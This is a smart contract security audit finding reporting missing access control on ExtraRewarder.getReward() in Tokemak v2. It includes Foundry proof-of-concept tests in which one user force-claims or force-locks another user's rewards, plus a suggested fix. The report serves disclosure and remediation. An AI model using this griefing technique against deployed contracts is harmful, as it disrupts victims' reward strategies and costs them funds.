Lively Coal Pike

medium

# Missing access control on #ExtraRewarder.getReward()
## Summary

**`ExtraRewarder.getReward()`** allows users to be claimed for which is not what the protocol inteded and it will lead to undesired consequences.

## Vulnerability Detail

**Note (This was confirmed by the sponsor):** *"Ah I see, yes that would be true and not desired ......... could have undesired consequences for that user."*

The **`getReward()`** function implementation:

```solidity
    function getReward(address account) public nonReentrant {
        _updateReward(account);
        _getReward(account);
    }
```

### ***A simple scenarios on how could this result in unexpected behavior for users (Paste this tests in [_getReward](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/test/rewarders/AbstractRewarder.t.sol#L648) contract)***

#### Case 1: Assume an extra rewarder with **`rewardToken == toke`**, **`tokeLockDuration` == 0**.

```solidity
    function getRewardWrapper(address user) public {
        rewarder.exposed_updateReward(user);
        rewarder.exposed_getRewardWrapper(user);
    }

    function test_AliceClaimsForBob() public {
        address toke = address(systemRegistry.toke());
        GPToke gPToke = _setupGpTokeAndTokeRewarder();
        _runDefaultScenarioGpToke();

        vm.prank(operator);
        rewarder.setTokeLockDuration(0);

        // Alice is the attacker in this scenario
        address ALICE = makeAddr("ALICE");
        // BOB is a long-term staker
        address BOB = makeAddr("BOB");

        assertEq(IERC20(toke).balanceOf(BOB), 0);

        // Alice called getReward() to claim Bob reward on his behalf.
        vm.prank(ALICE);
        getRewardWrapper(BOB);

        // Bob rewards claimed
        assertEq(IERC20(toke).balanceOf(BOB), 250000);
    }
```

***Result:***

```solidity
Test result: ok. 1 passed; 0 failed; finished in 7.20s
```

***Test Setup:***

- **`cd v2-core-audit-2023-07-14`**
- **`forge test --match-contract _getReward --match-test test_AliceClaimsForBob`**

#### Case 2: Bob wanted to wait until **`tokeLockDuration == 0`** to withdraw his rewards

```solidity
    function test_AliceStakeForBob() public {
        address toke = address(systemRegistry.toke());
        GPToke gPToke = _setupGpTokeAndTokeRewarder();
        _runDefaultScenarioGpToke();

        vm.prank(operator);
        rewarder.setTokeLockDuration(30 days);

        // Alice is the attacker in this scenario
        address ALICE = makeAddr("ALICE");
        // BOB is normal user
        address BOB = makeAddr("BOB");

        // Bob didn't want to stake but to wait until the tokeLockDuration ends to withdraw his rewards

        // Alice called getReward() to stake Bob reward on his behalf.
        vm.prank(ALICE);
        getRewardWrapper(BOB);

        // Bob's reward are now locked in GPToke
        assertEq(gPToke.balanceOf(BOB), 262374);
    }
```

***Result:***

```solidity
Test result: ok. 1 passed; 0 failed; finished in 8.00s
```

***Test Setup:***

- **`cd v2-core-audit-2023-07-14`**
- **`forge test --match-contract _getReward --match-test test_AliceStakeForBob`**

This vulnerability can disrupt the long-term strategies of users who rely on accumulating staking tokens over time, as the attack hinders their ability to do so effectively, and give everyone control over the users rewards.

## Impact

- Users who rely on a long-term strategy of accumulating rewards over time could be adversely affected. Malicious users could claim rewards prematurely, disrupting the intended accumulation process and strategy.
- Users may need to spend additional gas (Deployment chain is the mainnet) and incur transaction costs to correct the situation.
- Depending on the jurisdiction and tax regulations, claiming rewards on behalf of others could have tax implications for the victim.
- Anyone can lock other users rewards into GPToke.
- The unexpected behavior caused by this vulnerability could affect the stability and reliability of the protocol. Users might lose trust in the platform if they experience such issues.

## Code Snippet

- [ExtraRewarder.sol#L53-L56](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/rewarders/ExtraRewarder.sol#L53-L56)

## Tool used

Manual Review

## Recommendation

We recommend updating the function as follow since it should only be callable by the main rewarder or the owner of the account: 

```solidity
    function getReward(address account) public nonReentrant {
        require(msg.sender == mainReward || msg.sender == account, "Can't claim for others");
        _updateReward(account);
        _getReward(account);
    }
```
